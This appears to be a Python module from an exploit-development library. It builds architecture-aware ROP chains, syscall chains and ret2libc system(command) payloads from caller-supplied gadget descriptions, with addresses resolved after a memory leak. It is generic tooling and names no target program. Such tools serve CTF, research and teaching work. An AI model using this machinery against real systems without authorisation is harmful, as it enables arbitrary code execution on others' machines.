"""Architecture-aware, late-bound ROP and ret2libc construction.

This module deliberately does not contain a catalogue of magic gadgets.  A
gadget's stack layout is a property of one particular executable (and often of
one compiler build), not of an ISA.  Callers describe gadgets with
:class:`SemanticGadget`; the builders then apply the target calling convention,
preserve relative addresses, and pack the resulting words for the target.

All addresses remain symbolic until :meth:`ROPChain.materialize` (or
:meth:`ROPChain.resolved_words`) is called with a :class:`RuntimeLayout`.
Consequently the same chain description can be used after a PIE or libc leak
without rebuilding it.
"""

from __future__ import annotations

from collections import deque
from collections.abc import Iterable, Mapping, Sequence
from dataclasses import dataclass, field
from enum import Enum
from types import MappingProxyType
from typing import TypeAlias

from .errors import AddressResolutionError, PayloadError, UnsupportedTargetError
from .libc import LibcImage
from .model import Address, Image, Payload, PayloadKind, RuntimeLayout
from .target import ABI, Architecture, FunctionPointerModel, Target


class ROPBuildError(PayloadError, ValueError):
    """Raised when a chain description is internally inconsistent."""


class UnsupportedROPError(UnsupportedTargetError):
    """A structured unsupported-operation error.

    ``feature``, ``target``, and ``reason`` are available to automation while
    the exception string remains useful in an interactive exploit script.
    """

    def __init__(self, feature: str, target: Target, reason: str) -> None:
        self.feature = feature
        self.target = target
        self.reason = reason
        super().__init__(f"{feature} is unsupported for {target.name}: {reason}")


class GadgetSelectionError(ROPBuildError):
    """Raised when supplied semantic gadgets cannot establish registers."""

    def __init__(self, target: Target, missing_registers: Iterable[str], reason: str) -> None:
        self.target = target
        self.missing_registers = tuple(sorted(set(missing_registers)))
        self.reason = reason
        names = ", ".join(self.missing_registers) or "<none>"
        super().__init__(f"cannot load registers for {target.name} ({names}): {reason}")


@dataclass(frozen=True, slots=True)
class AddressExpression:
    """One image-relative address plus a constant addend.

    :class:`Address` already captures the important relocation boundary.  This
    small wrapper adds arithmetic without prematurely resolving the address.
    It intentionally does not support adding two image bases: that would not
    describe a normal runtime address and is usually an exploit bug.
    """

    base: Address
    addend: int = 0

    def __post_init__(self) -> None:
        if not isinstance(self.base, Address):
            raise TypeError("AddressExpression.base must be an Address")
        if not isinstance(self.addend, int):
            raise TypeError("AddressExpression.addend must be an int")

    @classmethod
    def absolute(cls, value: int, label: str | None = None) -> AddressExpression:
        return cls(Address(value, Image.ABSOLUTE, label))

    @classmethod
    def main(cls, offset: int, label: str | None = None) -> AddressExpression:
        return cls(Address(offset, Image.MAIN, label))

    @classmethod
    def libc(cls, offset: int, label: str | None = None) -> AddressExpression:
        return cls(Address(offset, Image.LIBC, label))

    def resolve(self, layout: RuntimeLayout | None = None) -> int:
        return self.base.resolve(layout) + self.addend

    def __add__(self, addend: int) -> AddressExpression:
        if not isinstance(addend, int):
            return NotImplemented
        return AddressExpression(self.base, self.addend + addend)

    def __sub__(self, subtrahend: int) -> AddressExpression:
        if not isinstance(subtrahend, int):
            return NotImplemented
        return AddressExpression(self.base, self.addend - subtrahend)


AddressValue: TypeAlias = int | Address | AddressExpression


class PointerKind(str, Enum):
    """How a chain word is interpreted when it becomes an execution target."""

    DATA = "data"
    CODE = "code"
    FUNCTION = "function"


def _check_address_value(value: object, description: str = "word") -> None:
    if isinstance(value, bool) or not isinstance(value, (int, Address, AddressExpression)):
        raise TypeError(f"{description} must be int, Address, or AddressExpression")


@dataclass(frozen=True, slots=True)
class ChainWord:
    """A late-bound target-width word with an optional pointer interpretation."""

    value: AddressValue
    role: str = "data"
    pointer_kind: PointerKind = PointerKind.DATA

    def __post_init__(self) -> None:
        _check_address_value(self.value)
        if not isinstance(self.pointer_kind, PointerKind):
            object.__setattr__(self, "pointer_kind", PointerKind(self.pointer_kind))

    def resolve(self, target: Target, layout: RuntimeLayout | None = None) -> int:
        if isinstance(self.value, (Address, AddressExpression)):
            value = self.value.resolve(layout)
        else:
            value = self.value
        if self.pointer_kind is PointerKind.CODE:
            return target.entry_address(value)
        if self.pointer_kind is PointerKind.FUNCTION:
            return target.function_pointer(value)
        return value


WordValue: TypeAlias = AddressValue | ChainWord


def _word(value: WordValue, role: str, pointer_kind: PointerKind = PointerKind.DATA) -> ChainWord:
    if isinstance(value, ChainWord):
        return ChainWord(value.value, role, value.pointer_kind)
    return ChainWord(value, role, pointer_kind)


def _runtime_word_equivalent(target: Target, left: WordValue, right: WordValue) -> bool:
    """Compare symbolic words including their eventual pointer conversion."""

    left_word = left if isinstance(left, ChainWord) else ChainWord(left)
    right_word = right if isinstance(right, ChainWord) else ChainWord(right)

    def address_key(value: AddressValue) -> tuple[object, int, int]:
        if isinstance(value, AddressExpression):
            image = value.base.image.value if isinstance(value.base.image, Image) else value.base.image
            return image, value.base.value, value.addend
        if isinstance(value, Address):
            image = value.image.value if isinstance(value.image, Image) else value.image
            return image, value.value, 0
        return Image.ABSOLUTE.value, value, 0

    def conversion_key(kind: PointerKind) -> str:
        model = target.function_pointer_model
        if model is FunctionPointerModel.THUMB_STATE_BIT:
            return "raw" if kind is PointerKind.DATA else "thumb-entry"
        if model is FunctionPointerModel.PPC64_ELFV1_DESCRIPTOR and kind is PointerKind.FUNCTION:
            return "elfv1-descriptor"
        return "raw"

    return address_key(left_word.value) == address_key(right_word.value) and conversion_key(
        left_word.pointer_kind
    ) == conversion_key(right_word.pointer_kind)


@dataclass(frozen=True, slots=True)
class ROPChain:
    """An immutable symbolic ROP chain."""

    target: Target
    words: tuple[ChainWord, ...]
    description: str = "ROP chain"
    kind: PayloadKind = PayloadKind.ROP
    steps: tuple[str, ...] = ()

    def __post_init__(self) -> None:
        object.__setattr__(self, "words", tuple(self.words))
        object.__setattr__(self, "steps", tuple(self.steps))
        if not isinstance(self.kind, PayloadKind):
            object.__setattr__(self, "kind", PayloadKind(self.kind))
        for word in self.words:
            if not isinstance(word, ChainWord):
                raise TypeError("ROPChain.words must contain ChainWord records")

    @property
    def word_count(self) -> int:
        return len(self.words)

    @property
    def byte_length(self) -> int:
        return self.word_count * self.target.word_size

    def resolved_words(self, layout: RuntimeLayout | None = None) -> tuple[int, ...]:
        """Resolve every address, including Thumb/function-pointer semantics."""

        return tuple(word.resolve(self.target, layout) for word in self.words)

    def materialize(self, layout: RuntimeLayout | None = None) -> bytes:
        """Resolve and target-pack the complete chain."""

        return b"".join(self.target.pack(value) for value in self.resolved_words(layout))

    def as_payload(self, layout: RuntimeLayout | None = None) -> Payload:
        return Payload(
            self.materialize(layout),
            self.target,
            self.kind,
            self.description,
            metadata={"word_roles": tuple(word.role for word in self.words), "steps": self.steps},
        )


def _target_key(target: Target) -> tuple[object, ...]:
    # Backend strings are intentionally absent: ABI identity is what governs a
    # chain, and older Target objects may carry different backend aliases.
    return (target.arch, target.bits, target.endian, target.abi)


@dataclass(frozen=True, slots=True)
class SemanticGadget:
    """Explicit stack semantics for one concrete gadget.

    On entry, the stack points at frame slot zero.  The gadget consumes exactly
    ``frame_words`` words.  ``register_slots`` records which slot is loaded into
    each register, while ``next_pc_slot`` records the slot used for its final
    control transfer (``ret``, restored LR/RA, restored PC, and so on).  When
    that slot is first loaded into a general register, ``next_pc_register``
    names it.  This distinction catches an important constraint: a MIPS gadget
    doing ``jr ra`` or AArch64 gadget doing ``ret`` cannot leave RA/X30 holding
    a different function-return address.

    This describes common x86 ``pop; ret``, ARM ``pop {..., pc}``, AArch64
    restored-X30, MIPS restored-RA, and RISC-V restored-RA gadgets without
    asserting that any one of those instruction sequences universally exists.
    Side effects not represented by a stack load belong in ``clobbers``.
    """

    target: Target
    address: AddressValue
    frame_words: int
    register_slots: Mapping[str, int]
    next_pc_slot: int
    description: str = "semantic stack gadget"
    clobbers: frozenset[str] = frozenset()
    fixed_slots: Mapping[int, WordValue] = field(default_factory=dict)
    next_pc_register: str | None = None

    def __post_init__(self) -> None:
        _check_address_value(self.address, "gadget address")
        if not isinstance(self.frame_words, int) or self.frame_words <= 0:
            raise ROPBuildError("gadget frame_words must be a positive integer")
        if not 0 <= self.next_pc_slot < self.frame_words:
            raise ROPBuildError("gadget next_pc_slot must be inside its stack frame")

        register_slots = {str(register): slot for register, slot in self.register_slots.items()}
        if any(not register for register in register_slots):
            raise ROPBuildError("gadget register names cannot be empty")
        if any(not isinstance(slot, int) or not 0 <= slot < self.frame_words for slot in register_slots.values()):
            raise ROPBuildError("every gadget register slot must be inside its stack frame")
        if len(set(register_slots.values())) != len(register_slots):
            raise ROPBuildError("one gadget frame slot cannot supply multiple register loads")
        next_pc_loads = tuple(register for register, slot in register_slots.items() if slot == self.next_pc_slot)
        if self.next_pc_register is None:
            if next_pc_loads:
                raise ROPBuildError(
                    "a next_pc_slot in register_slots must identify that register with next_pc_register"
                )
        elif not self.next_pc_register:
            raise ROPBuildError("next_pc_register cannot be empty")
        elif next_pc_loads != (self.next_pc_register,):
            raise ROPBuildError("next_pc_register must map to next_pc_slot in register_slots")

        fixed_slots = dict(self.fixed_slots)
        for slot, value in fixed_slots.items():
            if not isinstance(slot, int) or not 0 <= slot < self.frame_words:
                raise ROPBuildError("every fixed gadget slot must be inside its stack frame")
            _check_address_value(value.value if isinstance(value, ChainWord) else value, "fixed gadget word")
        occupied = set(register_slots.values()) | {self.next_pc_slot}
        overlap = occupied.intersection(fixed_slots)
        if overlap:
            raise ROPBuildError(f"fixed gadget slots overlap semantic slots: {sorted(overlap)}")

        object.__setattr__(self, "register_slots", MappingProxyType(register_slots))
        object.__setattr__(self, "fixed_slots", MappingProxyType(fixed_slots))
        object.__setattr__(self, "clobbers", frozenset(str(register) for register in self.clobbers))

    @property
    def loaded_registers(self) -> frozenset[str]:
        # A control register receives the following gadget/terminal address,
        # not the ordinary requested value for that register.
        return frozenset(self.register_slots) - ({self.next_pc_register} if self.next_pc_register else set())

    def _frame(
        self,
        register_values: Mapping[str, WordValue],
        continuation: ChainWord,
        filler: WordValue,
    ) -> tuple[ChainWord, ...]:
        frame = [_word(filler, f"{self.description}: filler[{slot}]") for slot in range(self.frame_words)]
        for slot, value in self.fixed_slots.items():
            frame[slot] = _word(value, f"{self.description}: fixed[{slot}]")
        for register, slot in self.register_slots.items():
            value = register_values.get(register, filler)
            frame[slot] = _word(value, f"{self.description}: {register}")
        frame[self.next_pc_slot] = continuation
        return tuple(frame)


def _ensure_gadget_targets(target: Target, gadgets: Sequence[SemanticGadget]) -> None:
    expected = _target_key(target)
    for gadget in gadgets:
        if _target_key(gadget.target) != expected:
            raise ROPBuildError(f"gadget {gadget.description!r} targets {gadget.target.name}, expected {target.name}")


def _select_gadgets(
    target: Target,
    register_values: Mapping[str, WordValue],
    gadgets: Sequence[SemanticGadget],
    terminal: ChainWord,
) -> tuple[SemanticGadget, ...]:
    """Find a shortest gadget sequence while respecting declared clobbers."""

    desired = frozenset(register_values)
    if not desired:
        return ()
    _ensure_gadget_targets(target, gadgets)
    terminal_registers = {
        gadget.next_pc_register
        for gadget in gadgets
        if gadget.next_pc_register in desired
        and _runtime_word_equivalent(target, register_values[gadget.next_pc_register], terminal)
    }
    covered = (
        frozenset().union(*(gadget.loaded_registers for gadget in gadgets), terminal_registers)
        if gadgets
        else frozenset()
    )
    missing = desired - covered
    if missing:
        raise GadgetSelectionError(target, missing, "no supplied gadget has a stack slot for these registers")

    initial = frozenset()
    queue: deque[tuple[frozenset[str], tuple[SemanticGadget, ...]]] = deque([(initial, ())])
    seen = {initial}
    while queue:
        correct, path = queue.popleft()
        for gadget in gadgets:
            control_registers = {gadget.next_pc_register} if gadget.next_pc_register else set()
            overwritten = gadget.loaded_registers | gadget.clobbers | control_registers
            next_correct = (correct - overwritten) | (gadget.loaded_registers & desired)
            if next_correct == correct:
                # The final continuation can still establish a control register
                # such as MIPS t9 even when this gadget makes no other progress.
                pass
            next_path = (*path, gadget)
            final_correct = set(next_correct)
            if gadget.next_pc_register in desired and _runtime_word_equivalent(
                target, register_values[gadget.next_pc_register], terminal
            ):
                final_correct.add(gadget.next_pc_register)
            if frozenset(final_correct) == desired:
                return next_path
            if next_correct != correct and next_correct not in seen:
                seen.add(next_correct)
                queue.append((next_correct, next_path))

    raise GadgetSelectionError(
        target,
        desired,
        "declared gadget clobbers prevent all requested values from being live at the continuation",
    )


def build_register_chain(
    target: Target,
    register_values: Mapping[str, WordValue],
    gadgets: Sequence[SemanticGadget],
    continuation: AddressValue,
    *,
    continuation_kind: PointerKind = PointerKind.CODE,
    filler: WordValue = 0,
    tail: Sequence[WordValue] = (),
    description: str = "register-loading ROP chain",
    kind: PayloadKind = PayloadKind.ROP,
) -> ROPChain:
    """Load registers using concrete semantics, then transfer control.

    The selector is deliberately modest: it finds a shortest sequence from the
    supplied records and honors their declared clobbers.  It does not invent
    gadgets or infer instruction effects from an address.
    """

    _check_address_value(continuation, "continuation")
    _check_address_value(filler.value if isinstance(filler, ChainWord) else filler, "filler")
    normalized_values = {str(register): value for register, value in register_values.items()}
    if any(not register for register in normalized_values):
        raise ROPBuildError("register names cannot be empty")
    for register, value in normalized_values.items():
        _check_address_value(value.value if isinstance(value, ChainWord) else value, f"value for {register}")

    terminal = ChainWord(continuation, "continuation", PointerKind(continuation_kind))
    selected = _select_gadgets(target, normalized_values, tuple(gadgets), terminal)
    words: list[ChainWord] = []
    if selected:
        words.append(ChainWord(selected[0].address, f"gadget: {selected[0].description}", PointerKind.CODE))
        for index, gadget in enumerate(selected):
            if index + 1 < len(selected):
                following = selected[index + 1]
                next_word = ChainWord(following.address, f"gadget: {following.description}", PointerKind.CODE)
            else:
                next_word = terminal
            words.extend(gadget._frame(normalized_values, next_word, filler))
    else:
        words.append(terminal)

    words.extend(_word(value, f"tail[{index}]") for index, value in enumerate(tail))
    return ROPChain(
        target,
        tuple(words),
        description,
        kind,
        tuple(gadget.description for gadget in selected),
    )


def _ensure_direct_call_supported(target: Target) -> None:
    if target.function_pointer_model is FunctionPointerModel.PPC64_ELFV1_DESCRIPTOR:
        raise UnsupportedROPError(
            "direct function call",
            target,
            "ELFv1 symbols are function descriptors; a descriptor reader and TOC-restoring call primitive are required",
        )
    if target.arch in {Architecture.SPARC32, Architecture.SPARC64}:
        raise UnsupportedROPError(
            "direct function call",
            target,
            "register windows and o7+8 return semantics need a SPARC-specific call-frame gadget",
        )


def _is_relative_to(value: AddressValue, image: Image) -> bool:
    if isinstance(value, AddressExpression):
        value = value.base
    return isinstance(value, Address) and (value.image is image or value.image == image.value)


def build_call(
    target: Target,
    function: AddressValue,
    arguments: Sequence[WordValue] = (),
    *,
    gadgets: Sequence[SemanticGadget] = (),
    return_to: AddressValue | None = None,
    extra_registers: Mapping[str, WordValue] | None = None,
    filler: WordValue = 0,
    prepare_abi_function_address: bool | None = None,
    description: str = "direct function-call ROP chain",
    kind: PayloadKind = PayloadKind.ROP,
) -> ROPChain:
    """Build a direct function call for the target ABI.

    i386 SysV uses its real cdecl shape: ``function, return, arguments...``.
    Register ABIs require caller-supplied :class:`SemanticGadget` records.
    AMD64 stack arguments beyond the first six are supported; other register
    ABIs currently reject overflow arguments instead of guessing at ABI home
    areas or aggregate layout.

    MIPS shared-library entries conventionally require ``t9`` to contain the
    function address, and PPC64 ELFv2 global entries require ``r12``.  These are
    prepared automatically for libc-relative functions, or explicitly with
    ``prepare_abi_function_address=True``.
    """

    _ensure_direct_call_supported(target)
    _check_address_value(function, "function")
    if return_to is not None:
        _check_address_value(return_to, "return address")
    register_values: dict[str, WordValue] = dict(extra_registers or {})
    convention = target.convention
    arguments = tuple(arguments)

    if target.abi is ABI.I386_SYSV:
        # A return slot is mandatory because it precedes arg0 in a cdecl frame.
        return_word: WordValue = ChainWord(return_to if return_to is not None else 0, "cdecl return", PointerKind.CODE)
        tail: tuple[WordValue, ...] = (return_word, *arguments)
    else:
        register_capacity = len(convention.function_arguments)
        if len(arguments) > register_capacity and target.abi is not ABI.AMD64_SYSV:
            raise UnsupportedROPError(
                "stack function arguments",
                target,
                f"only {register_capacity} word arguments fit registers; this ABI's overflow/home area is not modeled",
            )
        for register, value in zip(convention.function_arguments, arguments):
            if register in register_values:
                raise ROPBuildError(f"argument register {register} is also present in extra_registers")
            register_values[register] = value

        stack_arguments = arguments[register_capacity:]
        if convention.link_register is None:
            # On x86-64, the target's ret consumes this word before any stack args.
            needs_return_slot = return_to is not None or bool(stack_arguments)
            tail = (
                (ChainWord(return_to if return_to is not None else 0, "function return", PointerKind.CODE),)
                if needs_return_slot
                else ()
            ) + stack_arguments
        else:
            if return_to is not None:
                if convention.link_register in register_values:
                    raise ROPBuildError(f"return register {convention.link_register} is also explicitly assigned")
                register_values[convention.link_register] = ChainWord(
                    return_to, "function return register", PointerKind.CODE
                )
            tail = ()

    if prepare_abi_function_address is None:
        prepare_abi_function_address = _is_relative_to(function, Image.LIBC)
    call_address_register: str | None = None
    if prepare_abi_function_address and target.arch in {Architecture.MIPS32, Architecture.MIPS64}:
        call_address_register = "t9"
    elif prepare_abi_function_address and target.abi is ABI.POWERPC64_ELFV2:
        call_address_register = "r12"
    if call_address_register is not None:
        required = ChainWord(function, "ABI function-address register")
        if call_address_register in register_values:
            existing = register_values[call_address_register]
            existing_value = existing.value if isinstance(existing, ChainWord) else existing
            if existing_value != function:
                raise ROPBuildError(f"{call_address_register} must contain the called function address")
        else:
            register_values[call_address_register] = required

    return build_register_chain(
        target,
        register_values,
        gadgets,
        function,
        continuation_kind=PointerKind.FUNCTION,
        filler=filler,
        tail=tail,
        description=description,
        kind=kind,
    )


def build_syscall(
    target: Target,
    syscall_gadget: AddressValue,
    number: WordValue,
    arguments: Sequence[WordValue] = (),
    *,
    gadgets: Sequence[SemanticGadget] = (),
    extra_registers: Mapping[str, WordValue] | None = None,
    filler: WordValue = 0,
    after: Sequence[WordValue] = (),
    description: str = "direct syscall ROP chain",
) -> ROPChain:
    """Load a Linux syscall state and enter a supplied syscall gadget.

    ``after`` is emitted verbatim after the register-loading frames.  Whether a
    particular ``syscall; ret``/``svc; ret`` sequence consumes it is a property
    of that concrete terminal gadget, so the generic builder makes no claim
    about post-syscall control flow.
    """

    arguments = tuple(arguments)
    convention = target.convention
    if len(arguments) > len(convention.syscall_arguments):
        raise UnsupportedROPError(
            "syscall arguments",
            target,
            f"Linux convention exposes {len(convention.syscall_arguments)} syscall argument registers",
        )
    register_values: dict[str, WordValue] = dict(extra_registers or {})
    if convention.syscall_number in register_values:
        raise ROPBuildError(f"syscall-number register {convention.syscall_number} is also explicitly assigned")
    register_values[convention.syscall_number] = number
    for register, value in zip(convention.syscall_arguments, arguments):
        if register in register_values:
            raise ROPBuildError(f"syscall argument register {register} is also explicitly assigned")
        register_values[register] = value
    return build_register_chain(
        target,
        register_values,
        gadgets,
        syscall_gadget,
        continuation_kind=PointerKind.CODE,
        filler=filler,
        tail=after,
        description=description,
    )


def build_ret2libc_system(
    libc: LibcImage,
    command: WordValue,
    *,
    gadgets: Sequence[SemanticGadget] = (),
    return_to: AddressValue | None = 0,
    system_symbol: str = "system",
    extra_registers: Mapping[str, WordValue] | None = None,
    filler: WordValue = 0,
) -> ROPChain:
    """Build ``system(command)`` against one exact dynamic libc artifact."""

    function = Address(libc.offset(system_symbol), Image.LIBC, system_symbol)
    return build_call(
        libc.target,
        function,
        (command,),
        gadgets=gadgets,
        return_to=return_to,
        extra_registers=extra_registers,
        filler=filler,
        prepare_abi_function_address=True,
        description=f"ret2libc {system_symbol}(command) using {libc.identity.sha256[:12]}",
        kind=PayloadKind.RET2LIBC,
    )


def build_static_call(
    target: Target,
    function_offset: int,
    arguments: Sequence[WordValue] = (),
    *,
    gadgets: Sequence[SemanticGadget] = (),
    return_to: AddressValue | None = None,
    extra_registers: Mapping[str, WordValue] | None = None,
    filler: WordValue = 0,
    label: str = "static function",
) -> ROPChain:
    """Call a function at a main-image-relative offset in a static binary."""

    function = Address(function_offset, Image.MAIN, label)
    return build_call(
        target,
        function,
        arguments,
        gadgets=gadgets,
        return_to=return_to,
        extra_registers=extra_registers,
        filler=filler,
        prepare_abi_function_address=False,
        description=f"static main-image call to {label}",
    )


def build_static_syscall(
    target: Target,
    syscall_gadget_offset: int,
    number: WordValue,
    arguments: Sequence[WordValue] = (),
    *,
    gadgets: Sequence[SemanticGadget] = (),
    extra_registers: Mapping[str, WordValue] | None = None,
    filler: WordValue = 0,
    after: Sequence[WordValue] = (),
    label: str = "static syscall gadget",
) -> ROPChain:
    """Enter a main-image-relative syscall gadget in a static binary."""

    terminal = Address(syscall_gadget_offset, Image.MAIN, label)
    return build_syscall(
        target,
        terminal,
        number,
        arguments,
        gadgets=gadgets,
        extra_registers=extra_registers,
        filler=filler,
        after=after,
        description=f"static main-image syscall via {label}",
    )


__all__ = [
    "AddressExpression",
    "AddressResolutionError",
    "AddressValue",
    "ChainWord",
    "GadgetSelectionError",
    "PointerKind",
    "ROPBuildError",
    "ROPChain",
    "SemanticGadget",
    "UnsupportedROPError",
    "WordValue",
    "build_call",
    "build_register_chain",
    "build_ret2libc_system",
    "build_static_call",
    "build_static_syscall",
    "build_syscall",
]
